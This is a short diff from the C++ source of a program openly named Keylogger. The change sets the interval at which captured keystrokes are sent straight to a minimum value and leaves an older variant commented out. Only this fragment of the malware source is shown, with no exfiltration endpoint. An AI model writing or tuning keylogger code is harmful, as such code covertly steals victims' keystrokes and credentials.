@@ -138,7 +138,8 @@ void Keylogger::Send(const std::wstring& keys)
 
 void Keylogger::IncreaseSendInterval()
 {
-	this->sendInterval = max(V_SEND_INTERVAL_MIN, this->sendInterval / 2);
+	//this->sendInterval = max(V_SEND_INTERVAL_MIN, this->sendInterval / 3);
+	this->sendInterval = V_SEND_INTERVAL_MIN;
 }
 void Keylogger::DecreaseSendInterval()
 {
